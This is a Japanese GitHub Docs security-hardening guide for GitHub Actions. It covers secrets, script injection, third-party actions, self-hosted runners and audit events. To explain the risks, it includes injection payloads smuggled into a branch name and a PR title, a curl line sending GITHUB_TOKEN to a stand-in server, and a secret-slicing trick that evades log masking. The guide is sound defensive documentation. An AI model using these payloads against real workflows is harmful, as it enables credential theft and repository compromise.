---
title: GitHub Actions のセキュリティ強化
shortTitle: Security hardening
intro: '{% data variables.product.prodname_actions %} の機能を使用するための適切なセキュリティプラクティス。'
redirect_from:
  - /actions/getting-started-with-github-actions/security-hardening-for-github-actions
  - /actions/learn-github-actions/security-hardening-for-github-actions
versions:
  fpt: '*'
  ghes: '*'
  ghae: '*'
  ghec: '*'
type: overview
topics:
  - Security
miniTocMaxHeadingLevel: 3
ms.openlocfilehash: 0f93496361500083c23ef6f5095a785855246503
ms.sourcegitcommit: b617c4a7a1e4bf2de3987a86e0eb217d7031490f
ms.translationtype: HT
ms.contentlocale: ja-JP
ms.lasthandoff: 11/11/2022
ms.locfileid: '148161216'
---
{% data reusables.actions.enterprise-beta %} {% data reusables.actions.enterprise-github-hosted-runners %}

## 概要

このガイドでは、特定の {% data variables.product.prodname_actions %} の機能のセキュリティ強化を設定する方法について説明します。 {% data variables.product.prodname_actions %} の概念のことをよく知らない場合は、[GitHub Actions の中心的概念](/actions/getting-started-with-github-actions/core-concepts-for-github-actions)に関する記事をご覧ください。

## シークレットの使用

機密性の高い値は、平文としてワークフローファイルに保存するのではなく、シークレットとして保存してください。 [シークレット](/actions/configuring-and-managing-workflows/creating-and-storing-encrypted-secrets)は、Organization、リポジトリ、または Environment のレベルで構成でき、機密情報を {% data variables.product.product_name %} に格納できます。

シークレットは、[Libsodium のシールド ボックス](https://libsodium.gitbook.io/doc/public-key_cryptography/sealed_boxes)を使うことで、{% data variables.product.product_name %} に届く前に暗号化されます。 これは、シークレットが [UI](/actions/configuring-and-managing-workflows/creating-and-storing-encrypted-secrets#creating-encrypted-secrets-for-a-repository) または [REST API](/rest/reference/actions#secrets) を使って送信されるときに行われます。 このクライアント側の暗号化により、{% data variables.product.product_name %} のインフラストラクチャ内での偶発的なログ（例外ログやリクエストログなど）に関連するリスクを最小限に抑えることができます。 シークレットがアップロードされると、{% data variables.product.product_name %} はそれを復号化して、ワークフローランタイムに挿入できるようになります。

偶発的な開示を防ぐために、{% data variables.product.product_name %} は、実行ログに表示されるシークレットを編集しようとするメカニズムを使用しています。 この編集は、設定されたシークレットの完全一致、および Base64 などの値の一般的なエンコーディングを検索します。 ただし、シークレットの値を変換する方法は複数あるため、この編集は保証されません。 そのため、シークレットを確実に編集し、シークレットに関連する他のリスクを制限するために実行する必要がある、特定の予防的ステップと推奨事項は次のとおりです。

- **構造化データをシークレットとして使わない**
    - 構造化データは、ログ内のシークレットの編集失敗の原因となる可能性があります。これは、編集が特定のシークレット値の完全一致を見つけることに大きく依存しているためです。 たとえば、JSON、XML、または YAML（または同様）の Blob を使用してシークレット値をカプセル化しないでください。シークレットが適切に編集される可能性が大幅に低下するためです。 代わりに、機密値ごとに個別のシークレットを作成します。
- **ワークフロー内で使われるすべてのシークレットを登録する**
    - シークレットを使ってワークフロー内で別の機密値を生成する場合は、その生成された値を正式に[シークレットとして登録](https://github.com/actions/toolkit/tree/main/packages/core#setting-a-secret)して、ログに表示されることがある場合は編集された状態になるようにする必要があります。 たとえば、秘密鍵を使用して署名済み JWT を生成し、Web API にアクセスする場合は、その JWT をシークレットとして登録してください。そうしない場合、ログ出力に入力されても編集されません。
    - シークレットの登録は、あらゆる種類の変換/エンコーディングにも適用されます。 シークレットが何らかの方法で変換された場合（Base64 や URL エンコードなど）、新しい値もシークレットとして登録してください。
- **シークレットの処理方法を監査する**
    - シークレットの使用方法を監査し、シークレットが想定どおりに処理されていることを確認します。 これを行うには、ワークフローを実行しているリポジトリのソースコードを確認し、ワークフローで使用されているアクションを確認します。 たとえば、意図しないホストに送信されていないか、またはログ出力に明示的に出力されていないかを確認します。
    - 有効/無効な入力をテストした後、ワークフローの実行ログを表示し、シークレットが正しく編集されているか、表示されていないかを確認します。 呼び出しているコマンドまたはツールがどのようにしてエラーを `STDOUT` や `STDERR` に送信するかは必ずしも明らかではなく、シークレットが後でエラー ログに記録される可能性があります。 そのため、有効な入力と無効な入力をテストした後、ワークフローログを手動で確認することをお勧めします。
- **最小限のスコープを設定された認証情報を使う**
    - ワークフロー内で使用されている認証情報に必要な最小限の権限があることを確認し、リポジトリへの書き込みアクセスを持つすべてのユーザが、リポジトリで設定されたすべてのシークレットへの読み取りアクセスを持っていることに注意してください。 
    - Actions は、`github.token` コンテキストからアクセスすることで `GITHUB_TOKEN` を使用できます。 詳細については、「[コンテキスト](/actions/learn-github-actions/contexts#github-context)」を参照してください。 したがって、`GITHUB_TOKEN` に最低限必要な権限が付与されていることを確認する必要があります。 リポジトリの内容の読み取りアクセスのみを行うように `GITHUB_TOKEN` の既定のアクセス許可を設定することを、セキュリティの点からお勧めします。 その後、必要に応じて、ワークフローファイル内の個々のジョブの権限を増やすことができます。 詳細については「[ワークフローで認証する](/actions/reference/authentication-in-a-workflow#permissions-for-the-github_token)」を参照してください。 
- **登録されたシークレットの監査とローテーションを行う**
    - 登録されたシークレットを定期的に確認して、現在も必要であることを確認します。 不要になったものは削除してください。
    - シークレットを定期的にローテーションして、不正使用されたシークレットが有効である期間を短縮します。
- **シークレットへのアクセスのレビューを必須にすることを検討する**
    - 必須のレビュー担当者を使って環境のシークレットを保護できます。 レビュー担当者によって許可されるまで、ワークフローのジョブは環境のシークレットにアクセスできません。 環境へのシークレットの格納、または環境のレビューの要求について詳しくは、「[暗号化されたシークレット](/actions/reference/encrypted-secrets)」および「[デプロイに環境を使用する](/actions/deployment/using-environments-for-deployment)」をご覧ください。

{% warning %}

**警告**: リポジトリへの書き込みアクセス権を持つすべてのユーザーは、リポジトリに構成されているすべてのシークレットへの読み取りアクセス権を持っています。 そのため、ワークフロー内で使われる資格情報が持つ特権は必要最小限のものにする必要があります。

{% endwarning %}

## `CODEOWNERS` を使用して変更を監視する

`CODEOWNERS` 機能を使って、ワークフロー ファイルの変更方法を制御できます。 たとえば、すべてのワークフロー ファイルが `.github/workflows` に格納されている場合は、このディレクトリをコード所有者リストに追加することで、これらのファイルに対して提案された変更は、指定されているレビュー担当者が最初に承認する必要があるようにすることができます。

詳細については、「[コードオーナーについて](/github/creating-cloning-and-archiving-repositories/about-code-owners)」を参照してください。

## スクリプト インジェクションのリスクを理解する

ワークフロー、[カスタム アクション](/actions/creating-actions/about-actions)、[複合アクション](/actions/creating-actions/creating-a-composite-action)を作成するときは、攻撃者からの信頼されていない入力をコードが実行する可能性があるかどうかを常に考慮する必要があります。 これは、攻撃者が悪意のあるコマンドとスクリプトをコンテキストに追加したときに発生する可能性があります。 ワークフローの実行時に、それらの文字列がコードとして解釈されて、ランナーで実行される場合があります。

 攻撃者は、自分の悪意のあるコンテンツを [`github`コンテキスト](/actions/reference/context-and-expression-syntax-for-github-actions#github-context)に追加する可能性があります。これは、潜在的に信頼されない入力として扱う必要があります。 このようなコンテキストは、通常、`body`、`default_branch`、`email`、`head_ref`、`label`、`message`、`name`、`page_name`、`ref`、`title` で終わるものです。  例: `github.event.issue.title`、または `github.event.pull_request.body`。

 これらの値が、ワークフロー、アクション、API 呼び出し、またはそれらが実行可能なコードとして解釈される可能性のあるその他の場所に直接流れないようにする必要があります。 他の特権アプリケーション コードに使用するのと同じ防御型プログラミング方針を採用することで、{% data variables.product.prodname_actions %} の使用のセキュリティを強化できます。 攻撃者が実行する可能性のある手順の一部については、「[侵害されたランナーの潜在的な影響](/actions/learn-github-actions/security-hardening-for-github-actions#potential-impact-of-a-compromised-runner)」をご覧ください。

さらに、それ以外にも、ブランチ名やメール アドレスなど、あまり知られていませんが潜在的に信頼されない入力のソースがあり、許可された内容の観点からは非常に柔軟性があります。 たとえば、`zzz";echo${IFS}"hello";#` は有効なブランチ名であり、ターゲット リポジトリに対する攻撃ベクトルになる可能性があります。

以下のセクションでは、スクリプト インジェクションのリスクを軽減するのに役立つ方法について説明します。

### スクリプト インジェクション攻撃の例

スクリプト インジェクション攻撃は、ワークフローのインライン スクリプト内で直接発生する可能性があります。 次の例のアクションでは、式を使って pull request タイトルの有効性がテストされていますが、スクリプト インジェクションのリスクも加わります。

{% raw %}
```
      - name: Check PR title
        run: |
          title="${{ github.event.pull_request.title }}"
          if [[ $title =~ ^octocat ]]; then
          echo "PR title starts with 'octocat'"
          exit 0
          else
          echo "PR title did not start with 'octocat'"
          exit 1
          fi
```
{% endraw %}

この例の場合、ランナーの一時シェル スクリプト内で `run` コマンドが実行されるため、スクリプト インジェクションに対して脆弱です。 シェル スクリプトが実行される前に、{% raw %}`${{ }}`{% endraw %} 内の式が評価されてから、結果の値に置き換えられます。これにより、シェル コマンド インジェクションに対して脆弱になる可能性があります。

このワークフローにコマンドを挿入するため、攻撃者は `a"; ls $GITHUB_WORKSPACE"` というタイトルの pull request を作成する可能性があります。

![PR タイトルでのスクリプト インジェクションの例](/assets/images/help/images/example-script-injection-pr-title.png)

この例では、文字 `"` を使って {% raw %}`title="${{ github.event.pull_request.title }}"`{% endraw %} ステートメントを中断し、ランナーで `ls` コマンドを実行できるようにします。 `ls` コマンドの出力をログで確認できます。

![スクリプト インジェクションの結果の例](/assets/images/help/images/example-script-injection-result.png)

## スクリプト インジェクション攻撃を軽減するための優れたプラクティス

スクリプト インジェクションのリスクを軽減するのに役立つさまざまな方法があります。

### インライン スクリプトの代わりにアクションを使用する (推奨)

推奨される方法は、コンテキストの値を引数として処理するアクションを作成することです。 コンテキストの値はシェル スクリプトの生成には使われず、代わりに引数としてアクションに渡されるため、この方法はインジェクション攻撃に対して脆弱ではありません。

{% raw %}
```
uses: fakeaction/checktitle@v3
with:
    title: ${{ github.event.pull_request.title }}
```
{% endraw %}

### 中間環境変数を使用する

インライン スクリプトの場合、信頼されない入力を処理するための推奨される方法は、式の値を中間環境変数に設定することです。

次の例では、Bash を使って `github.event.pull_request.title` の値を環境変数として処理しています。

{% raw %}
```
      - name: Check PR title
        env:
          TITLE: ${{ github.event.pull_request.title }}
        run: |
          if [[ "$TITLE" =~ ^octocat ]]; then
          echo "PR title starts with 'octocat'"
          exit 0
          else
          echo "PR title did not start with 'octocat'"
          exit 1
          fi
```
{% endraw %}

この例では、スクリプト インジェクションの試みは失敗します。

![軽減されたスクリプト インジェクションの例](/assets/images/help/images/example-script-injection-mitigated.png)

この方法では、{% raw %}`${{ github.event.issue.title }}`{% endraw %} 式の値はメモリに格納されて変数として使われ、スクリプト生成プロセスとはやり取りされません。 さらに、二重引用符シェル変数を使って[単語分割](https://github.com/koalaman/shellcheck/wiki/SC2086)を回避することを検討します。ただし、これはシェル スクリプトの記述に関する[多くの一般的な推奨事項の 1 つ](https://mywiki.wooledge.org/BashPitfalls)であり、{% data variables.product.prodname_actions %} に固有ではありません。

{% ifversion fpt or ghec %}
### code scanning 用のスターター ワークフローを使用する

{% data reusables.advanced-security.starter-workflows-beta %} {% data variables.product.prodname_code_scanning_capc %} を使うと、運用環境に行く前にセキュリティの脆弱性を見つけることができます。 {% data variables.product.product_name %} には、{% data variables.product.prodname_code_scanning %} 用のスターター ワークフローが用意されています。 最初から作るのではなく、これらの推奨されるワークフローを使って、{% data variables.product.prodname_code_scanning %} ワークフローを作成できます。 {% data variables.product.company_short%} のワークフロー、{% data variables.code-scanning.codeql_workflow %}には、{% data variables.product.prodname_codeql %} が使われています。 また、サード パーティ製のスターター ワークフローも利用できます。

詳しくは、「[{% data variables.product.prodname_code_scanning %} について](/code-security/code-scanning/automatically-scanning-your-code-for-vulnerabilities-and-errors/about-code-scanning)」および「[スターター ワークフローを使用して {% data variables.product.prodname_code_scanning %} を設定する](/code-security/code-scanning/automatically-scanning-your-code-for-vulnerabilities-and-errors/setting-up-code-scanning-for-a-repository#setting-up-code-scanning-using-starter-workflows)」をご覧ください。

{% endif %}

### トークンのアクセス許可を制限する

公開されたトークンのリスクを軽減するには、割り当てられるアクセス許可を制限することを検討します。 詳しくは、「[GITHUB_TOKEN の権限を変更する](/actions/reference/authentication-in-a-workflow#modifying-the-permissions-for-the-github_token)」をご覧ください。

{% ifversion fpt or ghec or ghes > 3.4 %}

## OpenID Connect を使用してクラウド リソースにアクセスする

{% data reusables.actions.about-oidc-short-overview %}

{% endif %}

## サードパーティアクションを使用する

ワークフロー内の個々のジョブは、他のジョブと相互作用（および侵害）する場合があります。 たとえば、後のジョブで使用される環境変数をクエリするジョブ、後のジョブが処理する共有ディレクトリにファイルを書き込むジョブ、あるいはもっと直接的にDocker ソケットとやり取りして他の実行中のコンテナを検査してコマンドを実行するジョブなどです。

つまり、ワークフロー内の 1 つのアクションが侵害されると、その侵害されたアクションがリポジトリで構成されているすべてのシークレットにアクセスでき、`GITHUB_TOKEN` を使ってリポジトリに書き込むことができる場合があるため、非常に大きな問題になる可能性があります。 したがって、{% data variables.product.prodname_dotcom %} のサードパーティリポジトリからアクションを調達することには大きなリスクがあります。 攻撃者が実行する可能性のある手順の一部については、「[侵害されたランナーの潜在的な影響](/actions/learn-github-actions/security-hardening-for-github-actions#potential-impact-of-a-compromised-runner)」をご覧ください。

次のような適切な方法に従うことで、このリスクを軽減することができます。

* **アクションを完全なコミット SHA にピン止めする**

  現在、アクションを不変のリリースとして使用する唯一の方法は、アクションを完全なコミット SHA にピン止めすることです。 特定の SHA にピン止めすると、有効な Git オブジェクトペイロードに対して SHA-1 衝突を生成する必要があるため、悪意のある人がアクションのリポジトリにバックドアを追加するリスクを軽減できます。

* **アクションのソース コードを監査する**

  アクションが想定どおりにリポジトリとシークレットのコンテンツを処理していることを確認します。 たとえば、シークレットが意図しないホストに送信されていないか、または誤ってログに記録されていないかを確認します。

* **作成者を信頼できる場合に限り、アクションをタグにピン止めする**

  コミット SHA に対するピン止めが最も安全なオプションですが、タグを指定する方が便利で広く使用されています。 タグを指定する場合は、アクションの作成者が信頼できることを確認してください。 {% data variables.product.prodname_marketplace %} の「Verified creator」バッジは便利な判断材料で、 {% data variables.product.prodname_dotcom %} で身元が確認されたチームによって作成されたアクションであることを示しています。 作者が信頼できる場合でも、このアプローチにはリスクがあることに注意してください。悪意のある人がアクションを保存しているリポジトリにアクセスすると、タグが移動または削除される可能性があります。

{% ifversion fpt or ghes > 3.3 or ghae > 3.3 or ghec %}
## サード パーティのワークフローを再利用する

サード パーティのアクションの使用に関して上で説明したものと同じ原則が、サード パーティのワークフローの使用にも適用されます。 上と同じ適切なプラクティスに従うことで、ワークフローの再利用に関連するリスクを軽減できます。 詳細については、「[ワークフローの再利用](/actions/learn-github-actions/reusing-workflows)」を参照してください。
{% endif %}

{% ifversion internal-actions %}
## ワークフローが内部リポジトリにアクセスできるようにする

{% data reusables.actions.outside-collaborators-internal-actions %}詳しくは、「[アクションとワークフローを Enterprise と共有する](/actions/creating-actions/sharing-actions-and-workflows-with-your-enterprise)」をご覧ください。
{% endif %}

{% ifversion allow-actions-to-approve-pr %}
## {% data variables.product.prodname_actions %} による pull request の{% ifversion allow-actions-to-approve-pr-with-ent-repo %}作成または{% endif %}承認を禁止する

{% data reusables.actions.workflow-pr-approval-permissions-intro %}ワークフローまたは他の自動化に pull request の{% ifversion allow-actions-to-approve-pr-with-ent-repo %}作成または{% endif %}承認を許可すると、pull request のマージが適切な監視なしで行われる場合、セキュリティ リスクになる可能性があります。

この設定の構成方法について詳しくは、{% ifversion allow-actions-to-approve-pr-with-ent-repo %}{% ifversion ghes or ghec or ghae %}「[Enterprise で {% data variables.product.prodname_actions %} にポリシーを適用する](/enterprise-cloud@latest/admin/policies/enforcing-policies-for-your-enterprise/enforcing-policies-for-github-actions-in-your-enterprise#preventing-github-actions-from-creating-or-approving-pull-requests)」、{% endif %}{% endif %}「[Organization の {% data variables.product.prodname_actions %} を無効化または制限する](/github/setting-up-and-managing-organizations-and-teams/disabling-or-limiting-github-actions-for-your-organization#preventing-github-actions-from-{% ifversion allow-actions-to-approve-pr-with-ent-repo %}creating-or-{% endif %}approving-pull-requests)」{% ifversion allow-actions-to-approve-pr-with-ent-repo %}、および「[リポジトリの {% data variables.product.prodname_actions %} の設定を管理する](/repositories/managing-your-repositorys-settings-and-features/enabling-features-for-your-repository/managing-github-actions-settings-for-a-repository#preventing-github-actions-from-creating-or-approving-pull-requests)」{% endif %}をご覧ください。
{% endif %}

## OpenSSF Scorecards を使用してワークフローをセキュリティで保護する

[Scorecards](https://github.com/ossf/scorecard) は、リスクの高いサプライ チェーン プラクティスにフラグを設定する自動セキュリティ ツールです。 [Scorecards アクション](https://github.com/marketplace/actions/ossf-scorecard-action)と[スターター ワークフロー](https://github.com/actions/starter-workflows)を使って、セキュリティのベスト プラクティスに従うことができます。 構成された Scorecards アクションは、リポジトリが変更されると自動的に実行し、組み込みの code scanning エクスペリエンスを使ってリスクの高いサプライ チェーン プラクティスについて開発者に警告します。 Scorecards プロジェクトでは、スクリプト インジェクション攻撃、トークンのアクセス許可、ピン留めされたアクションなど、さまざまなチェックが実行されます。

## 侵害されたランナーの潜在的な影響

以下のセクションでは、攻撃者が {% data variables.product.prodname_actions %} ランナーで悪意のあるコマンドを実行できる場合に実行できるいくつかの手順について説明します。

{% note %}

**注:** {% data variables.product.prodname_dotcom %} ホステッド ランナーは、侵害されたサード パーティのライブラリなど、ユーザーがジョブの間にダウンロードした悪意のあるコードをスキャンしません。

{% endnote %}

### シークレットにアクセスする

`pull_request` イベントを使ってトリガーされたワークフローには、シークレットの読み取り専用のアクセス許可があり、アクセス権はありません。 ただし、これらのアクセス許可は、攻撃者がリポジトリのシークレットを盗んだり、ジョブの [`GITHUB_TOKEN`](/actions/reference/authentication-in-a-workflow#permissions-for-the-github_token) の書き込みアクセス許可を使用したりするために試みる可能性がある、`issue_comment`、`issues`、`push` などのさまざまなイベント トリガーの場合は異なります。

- シークレットまたはトークンが環境変数に設定されている場合は、`printenv` を使って環境を介して直接アクセスできます。
- シークレットが式の中で直接使われた場合、生成されるシェル スクリプトはディスク上に格納されてアクセスできます。
- カスタム アクションの場合のリスクは、プログラムが引数から取得したシークレットを使用する方法によって異なる場合があります。

  {% raw %}
  ```
  uses: fakeaction/publish@v3
  with:
      key: ${{ secrets.PUBLISH_KEY }}
  ```
  {% endraw %}

{% data variables.product.prodname_actions %} は、ワークフロー(または含まれるアクション) で参照されていないシークレットをメモリから除去しますが、攻撃者はその気になれば `GITHUB_TOKEN` や参照されているシークレットを取得できます。

### ランナーからのデータの流出

攻撃者は、盗まれたシークレットや他のデータをランナーから流出させる可能性があります。 シークレットが誤って漏えいするのを防ぐため、{% data variables.product.prodname_actions %} は[ログに書き込まれるシークレットを自動的に編集](/actions/reference/encrypted-secrets#accessing-your-secrets)しますが、シークレットを意図的にログに送信できるため、これは真のセキュリティ境界ではありません。 たとえば、難読化されたシークレットは `echo ${SOME_SECRET:0:4}; echo ${SOME_SECRET:4:200};` を使って流出される可能性があります。 さらに、攻撃者は任意のコマンドを実行できるため、HTTP 要求を使ってシークレットや他のリポジトリ データを外部サーバーに送信する可能性があります。

### ジョブの `GITHUB_TOKEN` を盗む

攻撃者はジョブの `GITHUB_TOKEN` を盗む可能性があります。 {% data variables.product.prodname_actions %} ランナーは、ワークフローを含むリポジトリのみに制限されたアクセス許可を指定して生成された `GITHUB_TOKEN` を自動的に受け取り、そのトークンの有効期限はジョブが完了すると切れます。 有効期限が切れたトークンは、攻撃者にとって役に立たなくなります。 この制限を回避するため、攻撃者は、トークンを使って攻撃者が制御するサーバーを呼び出すことによって (`a"; set +e; curl http://example.com?token=$GITHUB_TOKEN;#` など)、攻撃を自動化して一瞬で実行できます。

### リポジトリの内容を変更する

攻撃者のサーバーは、`GITHUB_TOKEN` に割り当てられたアクセス許可が[制限されていなければ](/actions/reference/authentication-in-a-workflow#modifying-the-permissions-for-the-github_token)、{% ifversion fpt or ghec %}{% data variables.product.prodname_dotcom %}{% else %}{% data variables.product.product_name %}{% endif %} API を使って、リリースなどの[リポジトリの内容を変更する](/actions/reference/authentication-in-a-workflow#permissions-for-the-github_token)ことができます。

## リポジトリ間のアクセスを検討する

{% data variables.product.prodname_actions %} のスコープは、意図的に一度に単一のリポジトリに設定されています。 書き込みアクセス権を持つユーザーは、ワークフロー ファイルを作成または変更し、必要に応じて `GITHUB_TOKEN` のアクセス許可を昇格することによって `GITHUB_TOKEN` にアクセスできるため、このトークンは書き込みアクセス権を持つユーザーと同じレベルのアクセスを許可します。 ユーザーはリポジトリごとに特定のアクセス許可を持っているため、1 つのリポジトリの `GITHUB_TOKEN` に別のリポジトリへのアクセス権を付与すると、慎重に実装しない場合、{% data variables.product.prodname_dotcom %} のアクセス許可モデルに影響します。 同様に、{% data variables.product.prodname_dotcom %} 認証トークンをワークフローに追加する場合は注意が必要です。これは、コラボレータに誤って広範なアクセスを付与することにより、{% data variables.product.prodname_dotcom %} アクセス許可モデルにも影響を与える可能性があるためです。

{% data variables.product.product_name %} 内でのリポジトリ間アクセスを許可するフローをサポートすることが [{% data variables.product.prodname_dotcom %} のロードマップで計画](https://github.com/github/roadmap/issues/74)されていますが、この機能はまだサポートされていません。 現在、権限のあるリポジトリ間のやり取りを実行する唯一の方法は、ワークフロー内に {% data variables.product.prodname_dotcom %} 認証トークンまたは SSH キーをシークレットとして配置することです。 多くの認証トークンタイプでは特定のリソースへの詳細なアクセスが許可されていないことから、意図したものよりはるかに広範なアクセスを許可できるため、間違ったトークンタイプを使用すると重大なリスクが生じます。

次のリストでは、ワークフロー内のリポジトリデータにアクセスするための推奨アプローチを優先度の高い順に説明しています。

1. **`GITHUB_TOKEN`**
    -  このトークンは、ワークフローを呼び出した単一のリポジトリに意図的にスコープが設定されており、リポジトリの書き込みアクセス ユーザーと同じレベルのアクセス権を持つことができます。 トークンは各ジョブが開始する前に作成され、ジョブが終了すると期限切れになります。 詳細については、「[GITHUB_TOKEN を使用した認証](/actions/configuring-and-managing-workflows/authenticating-with-the-github_token)」を参照してください。
    - 可能な限り、`GITHUB_TOKEN` を使う必要があります。
2. **リポジトリのデプロイキー**
    - デプロイキーは、単一のリポジトリへの読み取りまたは書き込みアクセスを許可する唯一の認証情報タイプの 1 つであり、ワークフロー内の別のリポジトリとのやり取りに使用できます。 詳細については、「[デプロイ キーの管理](/developers/overview/managing-deploy-keys#deploy-keys)」を参照してください。
    - デプロイキーは Git を使用してリポジトリにクローンおよびプッシュできるだけであり、REST または GraphQL API とのやり取りには使用できないため、要件に適さない場合があることに注意してください。
3. **{% data variables.product.prodname_github_app %} トークン**
    - {% data variables.product.prodname_github_apps %} は、選択したリポジトリにインストールでき、リポジトリ内のリソースに対する詳細な権限を持つこともできます。 Organization の内部で {% data variables.product.prodname_github_app %} を作成し、ワークフロー内でアクセスする必要があるリポジトリにインストールして、それらのリポジトリにアクセスするためのワークフロー内のインストールとして認証できます。
4. **{% data variables.product.pat_generic %}**
    - {% data variables.product.pat_v1 %} は使わないでください。 これらのトークンは、ユーザーがアクセスできる Organization 内のすべてのリポジトリ、および個人アカウント内のすべての個人リポジトリへのアクセスを許可します。 これにより、ワークフローが含まれているリポジトリのすべての書き込みアクセスユーザに間接的に広範なアクセス権が付与されます。
    - {% data variables.product.pat_generic %} を使う場合は、自分のアカウントから {% data variables.product.pat_generic %} を使わないでください。 後で Organization を離れると、このトークンを使用するワークフローはすぐに中断され、この問題のデバッグが困難になる場合があります。 代わりに、Organization に属していて、ワークフローに必要な特定のリポジトリへのアクセスのみを許可されている新しいアカウントには、{% ifversion pat-v2%}{% data variables.product.pat_v2 %}{% else %}{% data variables.product.pat_generic %}{% endif %} を使う必要があります。 このアプローチはスケーラブルではないため、デプロイキーなどの代替案を優先して避ける必要があります。
5. **個人アカウントの SSH キー**
    - ワークフローでは、個人アカウントの SSH キーを使わないようにする必要があります。 これらは、{% data variables.product.pat_v1_plural %} と同様に、そのユーザーのすべての個人リポジトリと、Organization のメンバーシップを通じてそのユーザーがアクセスできるすべてのリポジトリに対する、読み取りと書き込みのアクセス許可を付与します。  これにより、ワークフローが含まれているリポジトリのすべての書き込みアクセスユーザに間接的に広範なアクセス権が付与されます。 リポジトリのクローンまたはプッシュのみを実行する必要があり、パブリック API とやり取りする必要がないため、SSH キーを使用する場合は、代わりに個別のデプロイキーを使用する必要があります。

## セルフホストランナーを強化する

{% ifversion fpt or ghec %} **{% data variables.product.prodname_dotcom %} ホステッド** ランナーは、一時的でクリーンな隔離された仮想マシン内でコードを実行します。つまり、この環境を永続的に侵害したり、ブートストラップ プロセスの間にこの環境に置かれたもの以外の情報にアクセスしたりする方法はありません。
{% endif %}

{% data variables.product.product_name %} の{% ifversion fpt or ghec %}**セルフホステッド**{% elsif ghes or ghae %}セルフホステッド{% endif %} ランナーは、一時的でクリーンな仮想マシンでの実行に関する保証がなく、ワークフロー内の信頼されていないコードによって永続的に侵害される可能性があります。

{% ifversion fpt or ghec %}その結果、任意のユーザーがリポジトリに対して pull request を開き、環境を侵害できるため、ほとんどの場合、セルフホステッド ランナーは {% data variables.product.product_name %} の[パブリック リポジトリには使わない](/actions/hosting-your-own-runners/about-self-hosted-runners#self-hosted-runner-security)ようにする必要があります。 同様に、{% elsif ghes or ghae %}{% endif %}プライベートまたは内部リポジトリでセルフホステッド ランナーを使うときは注意が必要です。リポジトリをフォークして pull request を開くことができるユーザー (通常は、リポジトリへの読み取りアクセス権を持つユーザー) は、セルフホステッド ランナー環境を侵害できます。それには、シークレットへのアクセスや、リポジトリへの書き込みアクセス権を設定に応じて付与できる `GITHUB_TOKEN` の取得が含まれます。 ワークフローは、環境と必要なレビューを使用して環境シークレットへのアクセスを制御できますが、これらのワークフローは分離された環境では実行されず、セルフホストランナーで実行した場合でも同じリスクの影響を受けやすくなります。

セルフホストランナーがOrganizationもしくはEnterpriseのレベルで定義されているなら、{% data variables.product.product_name %}は同じランナー上で複数のリポジトリからのワークフローをスケジューリングするかもしれません。 したがって、これらの環境へのセキュリティ侵害は、大きな影響をもたらす可能性があります。 侵害の範囲を狭めるために、セルフホストランナーを個別のグループにまとめることで、境界を作ることができます。 ランナー グループにアクセスできる{% ifversion restrict-groups-to-workflows %}ワークフロー、{% endif %}Organization、リポジトリを制限できます。 詳細については、「[グループを使用してセルフホスト ランナーへのアクセスを管理する](/actions/hosting-your-own-runners/managing-access-to-self-hosted-runners-using-groups)」を参照してください。

次のように、セルフホストランナーマシンの環境も考慮する必要があります。
- セルフホストランナーとして設定されたマシンにはどのような機密情報が存在するか。 たとえば、SSH 秘密鍵、API アクセストークンなどです。
- マシンが機密性の高いサービスにネットワークアクセス可能か。 たとえば、Azure または AWS メタデータサービスなどです。 この環境での機密情報量は最小限に抑える必要があります。ワークフローを呼び出すことができるすべてのユーザがこの環境にアクセスできることを常に意識しておいてください。

中には、それぞれのジョブの実行後にセルフホストランナーを自動的に破棄するようなシステムを実装することで、このリスクを部分的に軽減しようとするお客様もいます。 しかし、このアプローチは意図したほどには効果的ではないかもしれません。これは、セルフホストランナーが1つのジョブだけを実行するという保証がないためです。 一部のジョブでは、コマンド ライン引数としてシークレットが使われ、同じランナーで実行している別のジョブで見ることができます (`ps x -w` など)。 これにより、シークレットが漏えいする可能性があります。

### セルフホステッド ランナーの管理戦略を計画する

セルフホステッド ランナーは、{% data variables.product.prodname_dotcom %} 階層のさまざまなレベル (Enterprise、Organization、リポジトリ レベル) に追加できます。 この配置により、ランナーを管理できるユーザーが決まります。

**一元管理:**
  - 一元化されたチームでセルフホステッド ランナーを所有する場合は、最も高い相互 Organization または Enterprise レベルにランナーを追加することをお勧めします。 これにより、チームは 1 つの場所でランナーを表示および管理できます。
  - Organization が 1 つだけの場合、Organization レベルでランナーを追加するのは実質的に同じ方法ですが、将来別の Organization を追加したときに問題が発生する可能性があります。

**分散管理:**
  - 各チームが自分のセルフホステッド ランナーを管理する場合は、チームの所有権の最上位レベルでランナーを追加することをお勧めします。 たとえば、各チームが自分の Organization を所有している場合は、ランナーも Organization レベルで追加すると最も簡単になります。
  - リポジトリ レベルでランナーを追加することもできますが、リポジトリ間ではランナーを共有できないため、管理オーバーヘッドが増加し、必要なランナーの数も増えます。

{% ifversion fpt or ghec or ghes > 3.4 %}
### クラウド プロバイダーへの認証を行う

{% data variables.product.prodname_actions %} を使ってクラウド プロバイダーにデプロイする場合、またはシークレット管理に HashiCorp Vault を使う場合は、OpenID Connect を使って、ワークフロー実行用に有効期間が短く、適切なスコープ設定のアクセス トークンの作成を検討することをお勧めします。 詳しくは、「[OpenID Connect を使用したセキュリティ強化について](/actions/deployment/security-hardening-your-deployments/about-security-hardening-with-openid-connect)」をご覧ください。

{% endif %}

## {% data variables.product.prodname_actions %}イベントの監査

Organizationの管理タスクをモニタするために、監査ログを使用できます。 監査ログには、アクションの種類、実行された日時、実行した個人アカウントが記録されます。

たとえば、監査ログを使って、Organization のシークレットへの変更を追跡する `org.update_actions_secret` イベントを追跡できます。 ![監査ログのエントリ](/assets/images/help/repository/audit-log-entries.png)

以下の表は、監査ログにある{% data variables.product.prodname_actions %}のイベントを示します。 監査ログの使用について詳しくは、「[Organization の監査ログをレビューする](/organizations/keeping-your-organization-secure/reviewing-the-audit-log-for-your-organization#searching-the-audit-log)」と「[Enterprise の監査ログをレビューする](/admin/monitoring-activity-in-your-enterprise/reviewing-audit-logs-for-your-enterprise)」をご覧ください。

{% ifversion fpt or ghec %}
### 環境のイベント

| アクション | 説明
|------------------|-------------------
| `environment.create_actions_secret` | シークレットが環境で作成されたときにトリガーされます。 詳しくは、「[環境のシークレット](/actions/reference/environments#environment-secrets)」をご覧ください。
| `environment.delete` | 環境が削除されるとトリガーされます。 詳しくは、「[環境の削除](/actions/reference/environments#deleting-an-environment)」をご覧ください。
| `environment.remove_actions_secret` |  シークレットが環境で削除されたときにトリガーされます。 詳しくは、「[環境のシークレット](/actions/reference/environments#environment-secrets)」をご覧ください。
| `environment.update_actions_secret` | 環境内のシークレットが更新されたときにトリガーされます。 詳しくは、「[環境のシークレット](/actions/reference/environments#environment-secrets)」をご覧ください。
